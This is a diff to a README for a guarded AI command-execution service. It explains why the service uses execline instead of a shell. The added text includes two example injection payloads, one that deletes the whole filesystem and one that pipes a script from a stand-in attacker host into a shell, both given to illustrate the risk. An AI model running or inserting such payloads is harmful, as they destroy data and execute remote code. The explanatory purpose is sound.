@@ -46,9 +46,35 @@ Same actions. Same hosts. But with guardrails that make AI delegation responsibl
 4. **Execution** — execline runs action (not shell, prevents injection)
 5. **Response** — JSON with audit trail: stdout, stderr, duration, exit code
 
-## Security Model
+## Why execline?
 
-### Layered Defense
+**Shell is fundamentally unsafe for AI execution. The guardrail is execline.**
+
+```bash
+# This is a security nightmare:
+ai_output="compile; rm -rf /"  # injected via prompt
+./run.sh $ai_output            # runs: compile; rm -rf /
+
+# Even "safe" commands are vulnerable:
+./build.sh $USER_INPUT        # user_input = "; curl attacker.com/shell | sh"
+```
+
+**execline eliminates shell as an attack vector:**
+
+| Shell | execline |
+|-------|----------|
+| `$VAR` interpolation | `import -env VAR` — explicit, no magic |
+| `cmd1; cmd2` chaining | Not possible without explicit `background` |
+| `cmd1 && cmd2` | Not an operator — `if` is a builtin |
+| `-c "$(cat)"` | `execlineb "$file"` — file never interpreted |
+
+**The guardrail: No shell. No interpretation layer. No injection surface.**
+
+With shell, `$anything` is a potential injection. With execline, the script IS the command. There's no interpretation layer to exploit.
+
+**Even if API key is compromised, whitelist limits actions. Even if whitelist bypassed, execline prevents shell injection.**
+
+## Security Model
 
 ```
 HTTP Request
@@ -59,21 +85,10 @@ Action whitelist
     ↓
 Args validation (regex)
     ↓
-execline execution
+execline execution ← the guardrail
     ↓
 JSON response + audit
 ```
-
-### Why execline?
-
-Shell is fundamentally unsafe for AI execution:
-- `$VAR` interpolation = injection vector
-- `; cmd` = command chaining
-- `&&`, `||` = flow control attacks
-
-execline has no shell interpolation. Variables use `import -env`. Commands can't chain. `execlineb "$file"` not `-c "$(cat)"`.
-
-**Even if API key is compromised, whitelist limits actions. Even if whitelist bypassed, execline prevents shell injection.**
 
 ## API
 
